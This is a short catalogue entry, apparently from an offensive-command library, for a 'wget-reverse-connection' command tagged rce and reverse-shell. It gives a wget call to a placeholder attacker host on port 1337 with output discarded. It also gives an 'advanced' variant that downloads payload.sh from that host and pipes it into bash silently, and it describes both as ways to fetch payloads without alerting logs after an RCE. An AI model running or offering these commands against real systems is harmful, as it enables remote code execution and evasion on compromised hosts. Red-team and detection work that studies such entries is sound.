---
data: 'wget -O- 1.2.3.4:1337 > /dev/null'
tags:
  - rce
  - reverse-shell
type: command
executor: bash
platforms:
  - Linux
id: acb6bfd5-03f3-4bf4-bdcc-5c308ce9a804
created_at: '2025-12-14T17:23:41.855Z'
updated_at: '2025-12-14T17:23:41.855Z'
verified: false
validated: true
submitted: true
---
# wget-reverse-connection

## Command

```bash
wget -O- 1.2.3.4:1337 > /dev/null
```

## Description

This command uses wget to silently download content from an attacker-controlled server on port 1337, outputting to stdout and discarding any visible output, commonly used in RCE exploits to establish an outbound connection or fetch payloads without alerting logs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-O-` | Outputs the downloaded content to stdout instead of a file | Yes |
| `1.2.3.4:1337` | Attacker's IP address and port to connect to for reverse shell or data exfiltration | Yes |
| `> /dev/null` | Redirects stdout to null device to suppress any output and avoid logging | Yes |

## Examples

### Basic Usage

```bash
wget -O- 1.2.3.4:1337 > /dev/null
```

### Advanced Usage

```bash
wget -O- http://1.2.3.4:1337/payload.sh | bash > /dev/null 2>&1
```

## Expected Output

No visible output due to redirection; successful execution results in an HTTP request to the attacker's server, potentially downloading and executing further payloads if chained.

## Related

- [[Related Procedure: Exploit-ImageMagick-RCE-with-MVG-Upload]]
